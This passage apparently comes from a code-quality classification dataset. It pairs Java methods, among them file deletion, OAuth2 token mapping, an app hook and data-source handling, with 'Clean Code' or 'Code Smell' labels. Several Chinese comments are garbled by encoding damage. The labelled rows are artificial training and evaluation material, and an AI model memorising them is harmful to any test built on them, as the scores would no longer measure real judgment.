}
",0,Clean Code
"/** 
 * 鍒犻櫎鏂囦欢澶逛互鍙婄洰褰曚笅鐨勬枃浠�
 * @param filePath 琚垹闄ょ洰褰曠殑鏂囦欢璺緞
 * @return 鐩綍鍒犻櫎鎴愬姛杩斿洖true锛屽惁鍒欒繑鍥瀎alse
 */
public static boolean deleteDirectory(String filePath){
  boolean flag;
  if (filePath == null || filePath.length() == 0)   return false;
  if (!filePath.endsWith(File.separator)) {
    filePath=filePath + File.separator;
  }
  File dirFile=new File(filePath);
  try {
    if (!dirFile.exists() || !dirFile.isDirectory()) {
      return false;
    }
    flag=true;
    File[] files=dirFile.listFiles();
    for (    File file : files) {
      if (file.isFile()) {
        flag=deleteFile(file.getAbsolutePath());
      }
 else {
        flag=deleteDirectory(file.getAbsolutePath());
      }
      if (!flag)       break;
    }
    if (!flag)     return false;
  }
 catch (  Exception e) {
    return false;
  }
  return dirFile.delete();
}",0,Clean Code
"Expression resolveCallExpressionInternal(Type targetType,String name,List<? extends ExpressionElement> inner,boolean implicit){
  int innerLength=inner.size();
  Expression result=null;
  TypedFunction resultFunction=null;
  functions:   for (  TypedFunction f : this.functionResolver.resolve(name,targetType)) {
    Parameter[] paramTypes=f.getParameters();
    if (paramTypes.length != innerLength)     continue;
    Expression[] params=new Expression[innerLength];
    for (int i=0; i < innerLength; i++) {
      ExpressionElement paramExpression=inner.get(i);
      Parameter param=paramTypes[i];
      if (param.constant() && !(paramExpression instanceof NumberToken)) {
        continue functions;
      }
      Expression expression=this.resolveExpressionInternal(param.type(),paramExpression,!implicit || innerLength > 1,implicit);
      if (expression == null)       continue functions;
      params[i]=expression;
    }
    if (result != null && f.priority() == resultFunction.priority()) {
      throw new RuntimeException(""Ambiguity, \n\told: "" + TypedFunction.format(resultFunction,"""") + ""\n\tnew: ""+ TypedFunction.format(f,""""));
    }
 else     if (resultFunction == null || f.priority() >= resultFunction.priority()) {
      result=new CallExpression(f,params);
      resultFunction=f;
    }
  }
  return result;
}",1,Code Smell
"/** 
 * 鐘舵��
 * @return 鎴愬姛
 */
public static SysResult ok(){
  return new SysResult(200,""ok"",null);
}
/** 
 * 鐘舵��
 * @param data vo瑕佸皝瑁呯殑鏁版嵁
 * @return vo
 */
public static SysResult ok(Object data){
  return new SysResult(200,""ok"",data);
}",0,Clean Code
"@Override public CfLogisticsStorehousePlatformCargoTypeExample getExampleByQuery(CfLogisticsStorehousePlatformCargoTypeQuery cfLogisticsStorehousePlatformCargoTypeQuery){
  CfLogisticsStorehousePlatformCargoTypeExample cfLogisticsStorehousePlatformCargoTypeExample=new CfLogisticsStorehousePlatformCargoTypeExample();
  CfLogisticsStorehousePlatformCargoTypeExample.Criteria criteria=cfLogisticsStorehousePlatformCargoTypeExample.createCriteria();
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId() != null) {
    criteria.andLogisticsStorehouseIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId() != null) {
    criteria.andLogisticsStorehousePlatformIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds().size() > 0) {
    criteria.andLogisticsStorehousePlatformIdIn(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId() != null) {
    criteria.andFactoryIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType() != null) {
    criteria.andCargoTypeEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy())) {
    cfLogisticsStorehousePlatformCargoTypeExample.setOrderByClause(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getPage() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsStorehousePlatformCargoTypeQuery.getPage(),cfLogisticsStorehousePlatformCargoTypeQuery.getSize());
  }
  return cfLogisticsStorehousePlatformCargoTypeExample;
}",0,Clean Code
"public NodePorts(final Node n,final Graph2D graph){
  final double width=graph.getWidth(n);
  final double halfWidth=width * 0.5;
  final double partWidth=graph.getWidth(n) / 3.0;
  final double halfHeight=graph.getHeight(n) * 0.5;
  double stepWidth=partWidth / (n.inDegree() + 1);
  double xOffset=0;
  for (int i=0; i < n.inDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,-halfHeight,PortCandidate.NORTH);
    topLeftPorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.inDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,-halfHeight,PortCandidate.NORTH);
    topMiddlePorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.inDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,-halfHeight,PortCandidate.NORTH);
    topRightPorts.add(pc);
    candidateSet.add(pc,1);
  }
  stepWidth=partWidth / (n.outDegree() + 1);
  xOffset=0;
  for (int i=0; i < n.outDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,halfHeight,PortCandidate.SOUTH);
    bottomLeftPorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.outDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,halfHeight,PortCandidate.SOUTH);
    bottomMiddlePorts.add(pc);
    candidateSet.add(pc,1);
  }
  xOffset+=stepWidth;
  for (int i=0; i < n.outDegree(); i++) {
    xOffset+=stepWidth;
    final PortCandidate pc=PortCandidate.createCandidate(xOffset - halfWidth,halfHeight,PortCandidate.SOUTH);
    bottomRightPorts.add(pc);
    candidateSet.add(pc,1);
  }
}",0,Clean Code
"@Test public void testArrayBinarySearchFloor(){
  long[] values=new long[0];
  assertThat(binarySearchFloor(values,0,false,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,0,false,true)).isEqualTo(0);
  values=new long[]{1,3,5};
  assertThat(binarySearchFloor(values,0,false,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,0,true,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,0,false,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,0,true,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,1,false,false)).isEqualTo(-1);
  assertThat(binarySearchFloor(values,1,true,false)).isEqualTo(0);
  assertThat(binarySearchFloor(values,1,false,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,1,true,true)).isEqualTo(0);
  assertThat(binarySearchFloor(values,4,false,false)).isEqualTo(1);
  assertThat(binarySearchFloor(values,4,true,false)).isEqualTo(1);
  assertThat(binarySearchFloor(values,5,false,false)).isEqualTo(1);
  assertThat(binarySearchFloor(values,5,true,false)).isEqualTo(2);
  assertThat(binarySearchFloor(values,6,false,false)).isEqualTo(2);
  assertThat(binarySearchFloor(values,6,true,false)).isEqualTo(2);
}",0,Clean Code
"void showAddQuickSearchDialog(final List<QuickSearch> list,final ArrayAdapter<QuickSearch> adapter,final ListView listView,final TextView tip){
  Context context=getEHContext();
  final ListUrlBuilder urlBuilder=mUrlBuilder;
  if (null == context || null == urlBuilder) {
    return;
  }
  if (ListUrlBuilder.MODE_IMAGE_SEARCH == urlBuilder.getMode()) {
    showTip(R.string.image_search_not_quick_search,LENGTH_LONG);
    return;
  }
  for (  QuickSearch q : list) {
    if (urlBuilder.equalsQuickSearch(q)) {
      showTip(getString(R.string.duplicate_quick_search,q.name),LENGTH_LONG);
      return;
    }
  }
  final EditTextDialogBuilder builder=new EditTextDialogBuilder(context,getSuitableTitleForUrlBuilder(context.getResources(),urlBuilder,false),getString(R.string.quick_search));
  builder.setTitle(R.string.add_quick_search_dialog_title);
  builder.setPositiveButton(android.R.string.ok,null);
  final AlertDialog dialog=builder.show();
  dialog.getButton(DialogInterface.BUTTON_POSITIVE).setOnClickListener(v -> {
    String text=builder.getText().trim();
    if (TextUtils.isEmpty(text)) {
      builder.setError(getString(R.string.name_is_empty));
      return;
    }
    for (    QuickSearch q : list) {
      if (text.equals(q.name)) {
        builder.setError(getString(R.string.duplicate_name));
        return;
      }
    }
    builder.setError(null);
    dialog.dismiss();
    QuickSearch quickSearch=urlBuilder.toQuickSearch();
    if (Settings.getShowTagTranslations()) {
      if (ehTags == null) {
        ehTags=EhTagDatabase.getInstance(context);
      }
      String[] parts=text.split(""(?=(?:(?:[^\""]*\""){2})*[^\""]*$)\\s+"");
      String newText="""";
      for (int i=0; i < parts.length; i++) {
        String[] tags=parts[i].split("":"");
        for (int j=0; j < tags.length; j++) {
          tags[j]=tags[j].replace(""\"""","""").replace(""$"","""");
        }
        quickSearch.name=TagTranslationUtil.getTagCN(tags,ehTags);
        if (newText.isEmpty()) {
          newText=TagTranslationUtil.getTagCN(tags,ehTags);
        }
 else {
          newText+="" "" + TagTranslationUtil.getTagCN(tags,ehTags);
        }
      }
      quickSearch.name=newText;
    }
 else {
      quickSearch.name=text;
    }
    EhDB.insertQuickSearch(quickSearch);
    list.add(quickSearch);
    adapter.notifyDataSetChanged();
    if (0 == list.size()) {
      tip.setVisibility(View.VISIBLE);
      listView.setVisibility(View.GONE);
    }
 else {
      tip.setVisibility(View.GONE);
      listView.setVisibility(View.VISIBLE);
    }
  }
);
}",1,Code Smell
"public Optional<String> evaluateAndUploadLargePayload(Map<String,Object> taskOutputData,String taskType){
  try (ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream()){
    objectMapper.writeValue(byteArrayOutputStream,taskOutputData);
    byte[] taskOutputBytes=byteArrayOutputStream.toByteArray();
    long taskResultSize=taskOutputBytes.length;
    MetricsContainer.recordTaskResultPayloadSize(taskType,taskResultSize);
    long payloadSizeThreshold=conductorClientConfiguration.getTaskOutputPayloadThresholdKB() * 1024L;
    if (taskResultSize > payloadSizeThreshold) {
      if (!conductorClientConfiguration.isExternalPayloadStorageEnabled() || taskResultSize > conductorClientConfiguration.getTaskOutputMaxPayloadThresholdKB() * 1024L) {
        throw new IllegalArgumentException(String.format(""The TaskResult payload size: %d is greater than the permissible %d bytes"",taskResultSize,payloadSizeThreshold));
      }
      MetricsContainer.incrementExternalPayloadUsedCount(taskType,ExternalPayloadStorage.Operation.WRITE.name(),ExternalPayloadStorage.PayloadType.TASK_OUTPUT.name());
      return Optional.of(uploadToExternalPayloadStorage(PayloadType.TASK_OUTPUT,taskOutputBytes,taskResultSize));
    }
    return Optional.empty();
  }
 catch (  IOException e) {
    String errorMsg=String.format(""Unable to update task: %s with task result"",taskType);
    LOGGER.error(errorMsg,e);
    throw new ConductorClientException(errorMsg,e);
  }
}",0,Clean Code
"@Override @Transactional public String checkOut(Long[] ids){
  List<NewBeeMallOrder> orders=newBeeMallOrderMapper.selectByPrimaryKeys(Arrays.asList(ids));
  String errorOrderNos="""";
  if (!CollectionUtils.isEmpty(orders)) {
    for (    NewBeeMallOrder newBeeMallOrder : orders) {
      if (newBeeMallOrder.getIsDeleted() == 1) {
        errorOrderNos+=newBeeMallOrder.getOrderNo() + "" "";
        continue;
      }
      if (newBeeMallOrder.getOrderStatus() != 1 && newBeeMallOrder.getOrderStatus() != 2) {
        errorOrderNos+=newBeeMallOrder.getOrderNo() + "" "";
      }
    }
    if (!StringUtils.hasText(errorOrderNos)) {
      if (newBeeMallOrderMapper.checkOut(Arrays.asList(ids)) > 0) {
        return ServiceResultEnum.SUCCESS.getResult();
      }
 else {
        return ServiceResultEnum.DB_ERROR.getResult();
      }
    }
 else {
      if (errorOrderNos.length() > 0 && errorOrderNos.length() < 100) {
        return errorOrderNos + ""璁㈠崟鐨勭姸鎬佷笉鏄敮浠樻垚鍔熸垨閰嶈揣瀹屾垚鏃犳硶鎵ц鍑哄簱鎿嶄綔"";
      }
 else {
        return ""浣犻�夋嫨浜嗗お澶氱姸鎬佷笉鏄敮浠樻垚鍔熸垨閰嶈揣瀹屾垚鐨勮鍗曪紝鏃犳硶鎵ц鍑哄簱鎿嶄綔"";
      }
    }
  }
  return ServiceResultEnum.DATA_NOT_EXIST.getResult();
}",1,Code Smell
"/** 
 * Returns the most restrictive type that is assignable from all given types.
 */
static Type gcd(Type... types){
  if (types.length == 0) {
    return Object.class;
  }
  Type best=types[0];
  Primitive bestPrimitive=Primitive.of(best);
  if (bestPrimitive != null) {
    for (int i=1; i < types.length; i++) {
      final Primitive primitive=Primitive.of(types[i]);
      if (primitive == null) {
        return Object.class;
      }
      if (primitive.assignableFrom(bestPrimitive)) {
        bestPrimitive=primitive;
      }
 else       if (bestPrimitive.assignableFrom(primitive)) {
      }
 else       if (bestPrimitive == Primitive.CHAR || bestPrimitive == Primitive.BYTE) {
        bestPrimitive=Primitive.INT;
        --i;
      }
 else {
        return Object.class;
      }
    }
    return bestPrimitive.primitiveClass;
  }
 else {
    for (int i=1; i < types.length; i++) {
      if (types[i] != types[0]) {
        return Object.class;
      }
    }
  }
  return types[0];
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.onnx.protos.ExampleTransformerProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.onnx.protos.ExampleTransformerProto other=(org.tribuo.interop.onnx.protos.ExampleTransformerProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public static void handleReadDocument(Activity activity,@Nullable Uri data) throws IOException, JSONException {
  if (data == null)   return;
  SharedPreferences.Editor edit=PrefsUtils.mSharedPreferences.edit();
  InputStream inputStream=activity.getContentResolver().openInputStream(data);
  BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(inputStream));
  StringBuilder stringBuilder=new StringBuilder();
  String line=bufferedReader.readLine();
  while (line != null) {
    stringBuilder.append(line);
    line=bufferedReader.readLine();
  }
  String read=stringBuilder.toString();
  JSONObject jsonObject=new JSONObject(read);
  Iterator<String> keys=jsonObject.keys();
  while (keys.hasNext()) {
    String key=keys.next();
    Object value=jsonObject.get(key);
    if (value instanceof String) {
      if (((String)value).contains(""["") && ((String)value).contains(""]"")) {
        value=((String)value).replace(""["","""").replace(""]"","""").replace("" "","""");
        String[] array=((String)value).split("","");
        List<String> list=Arrays.asList(array);
        Set<String> stringSet=new HashSet<>(list);
        edit.putStringSet(key,stringSet);
      }
 else {
        edit.putString(key,(String)value);
      }
    }
 else     if (value instanceof Boolean) {
      edit.putBoolean(key,(Boolean)value);
    }
 else     if (value instanceof Integer) {
      edit.putInt(key,(Integer)value);
    }
  }
  bufferedReader.close();
  edit.apply();
}
",1,Code Smell
"@SuppressWarnings(""rawtypes"") @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (Helper.prefs.getBoolean(""switch_mainswitch"",false)) {
    Object result=param.getResult();
    if (result == null)     return;
    Class<?> resultClass=result.getClass();
    if (result != null) {
      if (resultClass == ApiTemplateRoot) {
        String type=(String)Helper.DataUnique_type.get(ApiTemplateRoot_extra.get(result));
        if (Helper.prefs.getBoolean(""switch_video"",false) && (type.equals(""zvideo"") || type.equals(""drama""))) {
          param.setResult(null);
          return;
        }
        if (Helper.prefs.getBoolean(""switch_removearticle"",false) && (""article"".equals(type) || ""Post"".equals(type))) {
          param.setResult(null);
          return;
        }
        if (Helper.prefs.getBoolean(""switch_pin"",false) && ""pin"".equals(type)) {
          param.setResult(null);
          return;
        }
        if (Helper.prefs.getBoolean(""switch_feedad"",true) && ""SvipActivity"".equals(type)) {
          param.setResult(null);
          return;
        }
        Object feed_content=ApiFeedCard_feed_content.get(ApiTemplateRoot_common_card.get(result));
        if (feed_content == null)         return;
        Object video=ApiFeedContent_video.get(feed_content);
        if (Helper.prefs.getBoolean(""switch_video"",false) && video != null) {
          param.setResult(null);
        }
 else {
          if (Helper.regex_title == null && Helper.regex_author == null && Helper.regex_content == null)           return;
          if (Helper.regex_title != null) {
            String title=(String)ApiText_panel_text.get(ApiFeedContent_title.get(feed_content));
            if (Helper.regex_title.matcher(title).find()) {
              param.setResult(null);
            }
          }
          if (Helper.regex_author != null) {
            Object sourceLine=ApiFeedContent_sourceLine.get(feed_content);
            List elements=(List)ApiLine_elements.get(sourceLine);
            String author=(String)ApiText_panel_text.get(ApiElement_text.get(elements.get(1)));
            if (Helper.regex_author.matcher(author).find()) {
              param.setResult(null);
            }
          }
          if (Helper.regex_content != null) {
            String content=(String)ApiText_panel_text.get(ApiFeedContent_content.get(feed_content));
            if (Helper.regex_content.matcher(content).find()) {
              param.setResult(null);
            }
          }
        }
      }
 else       if (resultClass == MarketCard) {
        if (Helper.prefs.getBoolean(""switch_marketcard"",false)) {
          param.setResult(null);
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * @param majorVersion The client manifest major version.
 * @param minorVersion The client manifest minor version.
 * @param timescale The timescale of the media as the number of units that pass in one second.
 * @param duration The overall presentation duration in units of the timescale attribute, or 0 ifthe duration is unknown.
 * @param dvrWindowLength The length of the trailing window in units of the timescale attribute,or 0 if this attribute is unspecified or not applicable.
 * @param lookAheadCount The number of fragments in a lookahead, or {@link #UNSET_LOOKAHEAD} ifthis attribute is unspecified or not applicable.
 * @param isLive True if the manifest describes a live presentation still in progress. Falseotherwise.
 * @param protectionElement Content protection information, or null if the content is notprotected.
 * @param streamElements The contained stream elements.
 */
public SsManifest(int majorVersion,int minorVersion,long timescale,long duration,long dvrWindowLength,int lookAheadCount,boolean isLive,ProtectionElement protectionElement,StreamElement[] streamElements){
  this(majorVersion,minorVersion,duration == 0 ? C.TIME_UNSET : Util.scaleLargeTimestamp(duration,C.MICROS_PER_SECOND,timescale),dvrWindowLength == 0 ? C.TIME_UNSET : Util.scaleLargeTimestamp(dvrWindowLength,C.MICROS_PER_SECOND,timescale),lookAheadCount,isLive,protectionElement,streamElements);
}
private SsManifest(int majorVersion,int minorVersion,long durationUs,long dvrWindowLengthUs,int lookAheadCount,boolean isLive,ProtectionElement protectionElement,StreamElement[] streamElements){
  this.majorVersion=majorVersion;
  this.minorVersion=minorVersion;
  this.durationUs=durationUs;
  this.dvrWindowLengthUs=dvrWindowLengthUs;
  this.lookAheadCount=lookAheadCount;
  this.isLive=isLive;
  this.protectionElement=protectionElement;
  this.streamElements=streamElements;
}",0,Clean Code
"@Override public DatasourceDTO get(Long datasourceId) throws DEException {
  DatasourceDTO datasourceDTO=new DatasourceDTO();
  CoreDatasource datasource=datasourceMapper.selectById(datasourceId);
  BeanUtils.copyBean(datasourceDTO,datasource);
  TypeReference<List<ApiDefinition>> listTypeReference=new TypeReference<List<ApiDefinition>>(){
  }
;
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.API.toString())) {
    List<ApiDefinition> apiDefinitionList=JsonUtil.parseList(datasourceDTO.getConfiguration(),listTypeReference);
    List<ApiDefinition> apiDefinitionListWithStatus=new ArrayList<>();
    int success=0;
    for (    ApiDefinition apiDefinition : apiDefinitionList) {
      String status=null;
      if (StringUtils.isNotEmpty(datasourceDTO.getStatus())) {
        JsonNode jsonNode=null;
        try {
          jsonNode=objectMapper.readTree(datasourceDTO.getStatus());
        }
 catch (        Exception e) {
          DEException.throwException(e);
        }
        for (        JsonNode node : jsonNode) {
          if (node.get(""name"").asText().equals(apiDefinition.getName())) {
            status=node.get(""status"").asText();
          }
        }
        apiDefinition.setStatus(status);
      }
      if (StringUtils.isNotEmpty(status) && status.equalsIgnoreCase(""Success"")) {
        success++;
      }
      CoreDatasourceTaskLog log=datasourceTaskServer.lastSyncLogForTable(datasourceId,apiDefinition.getDeTableName());
      if (log != null) {
        apiDefinition.setUpdateTime(log.getStartTime());
      }
      apiDefinitionListWithStatus.add(apiDefinition);
    }
    datasourceDTO.setApiConfigurationStr(new String(Base64.getEncoder().encode(Objects.requireNonNull(JsonUtil.toJSONString(apiDefinitionListWithStatus)).toString().getBytes())));
    if (success == apiDefinitionList.size()) {
      datasourceDTO.setStatus(""Success"");
    }
 else {
      if (success > 0 && success < apiDefinitionList.size()) {
        datasourceDTO.setStatus(""Warning"");
      }
 else {
        datasourceDTO.setStatus(""Error"");
      }
    }
    CoreDatasourceTask coreDatasourceTask=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    TaskDTO taskDTO=new TaskDTO();
    BeanUtils.copyBean(taskDTO,coreDatasourceTask);
    datasourceDTO.setSyncSetting(taskDTO);
    CoreDatasourceTask task=datasourceTaskServer.selectByDSId(datasourceDTO.getId());
    if (task != null) {
      datasourceDTO.setLastSyncTime(task.getStartTime());
    }
  }
  if (datasourceDTO.getType().equalsIgnoreCase(DatasourceConfiguration.DatasourceType.Excel.toString())) {
    datasourceDTO.setFileName(ExcelUtils.getFileName(datasource));
    datasourceDTO.setSize(ExcelUtils.getSize(datasource));
  }
  datasourceDTO.setConfiguration(new String(Base64.getEncoder().encode(datasourceDTO.getConfiguration().getBytes())));
  datasourceDTO.setCreator(coreUserManage.getUserName(Long.valueOf(datasourceDTO.getCreateBy())));
  return datasourceDTO;
}",1,Code Smell
"private static boolean isNotSupportiveFallback(BlockState state,Direction facing){
  if (AllBlocks.MECHANICAL_DRILL.has(state))   return state.getValue(BlockStateProperties.FACING) == facing;
  if (AllBlocks.MECHANICAL_BEARING.has(state))   return state.getValue(BlockStateProperties.FACING) == facing;
  if (AllBlocks.CART_ASSEMBLER.has(state))   return Direction.DOWN == facing;
  if (AllBlocks.MECHANICAL_SAW.has(state))   return state.getValue(BlockStateProperties.FACING) == facing;
  if (AllBlocks.PORTABLE_STORAGE_INTERFACE.has(state))   return state.getValue(PortableStorageInterfaceBlock.FACING) == facing;
  if (state.getBlock() instanceof AttachedActorBlock && !AllBlocks.MECHANICAL_ROLLER.has(state))   return state.getValue(BlockStateProperties.HORIZONTAL_FACING) == facing;
  if (AllBlocks.ROPE_PULLEY.has(state))   return facing == Direction.DOWN;
  if (state.getBlock() instanceof WoolCarpetBlock)   return facing == Direction.UP;
  if (state.getBlock() instanceof SailBlock)   return facing.getAxis() == state.getValue(SailBlock.FACING).getAxis();
  if (AllBlocks.PISTON_EXTENSION_POLE.has(state))   return facing.getAxis() != state.getValue(BlockStateProperties.FACING).getAxis();
  if (AllBlocks.MECHANICAL_PISTON_HEAD.has(state))   return facing.getAxis() != state.getValue(BlockStateProperties.FACING).getAxis();
  if (AllBlocks.STICKER.has(state) && !state.getValue(StickerBlock.EXTENDED))   return facing == state.getValue(StickerBlock.FACING);
  if (state.getBlock() instanceof SlidingDoorBlock)   return false;
  return isBrittle(state);
}
",0,Clean Code
"private OAuth2Authorization toObject(Authorization entity){
  RegisteredClient registeredClient=this.registeredClientRepository.findById(entity.getRegisteredClientId());
  if (registeredClient == null) {
    throw new DataRetrievalFailureException(""The RegisteredClient with id '"" + entity.getRegisteredClientId() + ""' was not found in the RegisteredClientRepository."");
  }
  OAuth2Authorization.Builder builder=OAuth2Authorization.withRegisteredClient(registeredClient).id(entity.getId()).principalName(entity.getPrincipalName()).authorizationGrantType(resolveAuthorizationGrantType(entity.getAuthorizationGrantType())).authorizedScopes(StringUtils.commaDelimitedListToSet(entity.getAuthorizedScopes())).attributes(attributes -> attributes.putAll(parseMap(entity.getAttributes())));
  if (entity.getState() != null) {
    builder.attribute(OAuth2ParameterNames.STATE,entity.getState());
  }
  if (entity.getAuthorizationCodeValue() != null) {
    OAuth2AuthorizationCode authorizationCode=new OAuth2AuthorizationCode(entity.getAuthorizationCodeValue(),entity.getAuthorizationCodeIssuedAt(),entity.getAuthorizationCodeExpiresAt());
    builder.token(authorizationCode,metadata -> metadata.putAll(parseMap(entity.getAuthorizationCodeMetadata())));
  }
  if (entity.getAccessTokenValue() != null) {
    OAuth2AccessToken accessToken=new OAuth2AccessToken(OAuth2AccessToken.TokenType.BEARER,entity.getAccessTokenValue(),entity.getAccessTokenIssuedAt(),entity.getAccessTokenExpiresAt(),StringUtils.commaDelimitedListToSet(entity.getAccessTokenScopes()));
    builder.token(accessToken,metadata -> metadata.putAll(parseMap(entity.getAccessTokenMetadata())));
  }
  if (entity.getRefreshTokenValue() != null) {
    OAuth2RefreshToken refreshToken=new OAuth2RefreshToken(entity.getRefreshTokenValue(),entity.getRefreshTokenIssuedAt(),entity.getRefreshTokenExpiresAt());
    builder.token(refreshToken,metadata -> metadata.putAll(parseMap(entity.getRefreshTokenMetadata())));
  }
  if (entity.getOidcIdTokenValue() != null) {
    OidcIdToken idToken=new OidcIdToken(entity.getOidcIdTokenValue(),entity.getOidcIdTokenIssuedAt(),entity.getOidcIdTokenExpiresAt(),parseMap(entity.getOidcIdTokenClaims()));
    builder.token(idToken,metadata -> metadata.putAll(parseMap(entity.getOidcIdTokenMetadata())));
  }
  if (entity.getUserCodeValue() != null) {
    OAuth2UserCode userCode=new OAuth2UserCode(entity.getUserCodeValue(),entity.getUserCodeIssuedAt(),entity.getUserCodeExpiresAt());
    builder.token(userCode,metadata -> metadata.putAll(parseMap(entity.getUserCodeMetadata())));
  }
  if (entity.getDeviceCodeValue() != null) {
    OAuth2DeviceCode deviceCode=new OAuth2DeviceCode(entity.getDeviceCodeValue(),entity.getDeviceCodeIssuedAt(),entity.getDeviceCodeExpiresAt());
    builder.token(deviceCode,metadata -> metadata.putAll(parseMap(entity.getDeviceCodeMetadata())));
  }
  return builder.build();
}",0,Clean Code
"@SuppressWarnings(""PMD.AvoidRethrowingException"") static Engine newInstance(){
  try {
    LibUtils.loadLibrary();
    JniUtils.setGradMode(false);
    if (Integer.getInteger(""ai.djl.pytorch.num_interop_threads"") != null) {
      JniUtils.setNumInteropThreads(Integer.getInteger(""ai.djl.pytorch.num_interop_threads""));
    }
    if (Integer.getInteger(""ai.djl.pytorch.num_threads"") != null) {
      JniUtils.setNumThreads(Integer.getInteger(""ai.djl.pytorch.num_threads""));
    }
    if (Boolean.getBoolean(""ai.djl.pytorch.cudnn_benchmark"")) {
      JniUtils.setBenchmarkCuDNN(true);
    }
    if (""true"".equals(System.getProperty(""ai.djl.pytorch.graph_optimizer"",""true""))) {
      logger.info(""PyTorch graph executor optimizer is enabled, this may impact your"" + "" inference latency and throughput. See:"" + "" https://docs.djl.ai/master/docs/development/inference_performance_optimization.html#graph-executor-optimization"");
    }
    logger.info(""Number of inter-op threads is {}"",JniUtils.getNumInteropThreads());
    logger.info(""Number of intra-op threads is {}"",JniUtils.getNumThreads());
    String paths=Utils.getEnvOrSystemProperty(""PYTORCH_EXTRA_LIBRARY_PATH"");
    if (paths != null) {
      String[] files=paths.split("","");
      for (      String file : files) {
        Path path=Paths.get(file);
        if (Files.notExists(path)) {
          throw new FileNotFoundException(""PyTorch extra Library not found: "" + file);
        }
        System.load(path.toAbsolutePath().toString());
      }
    }
    return new PtEngine();
  }
 catch (  EngineException e) {
    throw e;
  }
catch (  Throwable t) {
    throw new EngineException(""Failed to load PyTorch native library"",t);
  }
}
",1,Code Smell
"/** 
 * FS interface method start 
 */
@Override public void init(Map<String,String> properties) throws IOException {
  if (label == null && (boolean)org.apache.linkis.common.conf.Configuration.IS_MULTIPLE_YARN_CLUSTER()) {
    label=StorageConfiguration.LINKIS_STORAGE_FS_LABEL().getValue();
  }
  conf=HDFSUtils.getConfigurationByLabel(user,label);
  Map<String,String> originProperties=Maps.newHashMap();
  originProperties.put(""fs.oss.endpoint"",StorageConfiguration.OSS_ENDPOINT().getValue());
  originProperties.put(""fs.oss.accessKeyId"",StorageConfiguration.OSS_ACCESS_KEY_ID().getValue());
  originProperties.put(""fs.oss.accessKeySecret"",StorageConfiguration.OSS_ACCESS_KEY_SECRET().getValue());
  for (  String key : originProperties.keySet()) {
    String value=originProperties.get(key);
    if (StringUtils.isNotBlank(value)) {
      conf.set(key,value);
    }
  }
  if (MapUtils.isNotEmpty(properties)) {
    for (    String key : properties.keySet()) {
      String v=properties.get(key);
      if (StringUtils.isNotBlank(v)) {
        conf.set(key,v);
      }
    }
  }
  fs=new AliyunOSSFileSystem();
  try {
    fs.initialize(new URI(StorageUtils.OSS_SCHEMA() + StorageConfiguration.OSS_ACCESS_BUCKET_NAME().getValue()),conf);
  }
 catch (  URISyntaxException e) {
    throw new IOException(""init OSS FileSystem failed!"");
  }
  if (fs == null) {
    throw new IOException(""init OSS FileSystem failed!"");
  }
}
",1,Code Smell
"public ApiError(HttpStatus status,LocalDateTime timestamp,String message,String debugMessage,List<ApiSubError> subErrors){
  super();
  this.status=status;
  this.timestamp=timestamp;
  this.message=message;
  this.debugMessage=debugMessage;
  this.subErrors=subErrors;
}
private ApiError(){
  timestamp=LocalDateTime.now();
}
ApiError(HttpStatus status){
  this();
  this.status=status;
}
ApiError(HttpStatus status,Throwable ex){
  this();
  this.status=status;
  this.message=""Unexpected error"";
  this.debugMessage=ex.getLocalizedMessage();
}
ApiError(HttpStatus status,String message,Throwable ex){
  this();
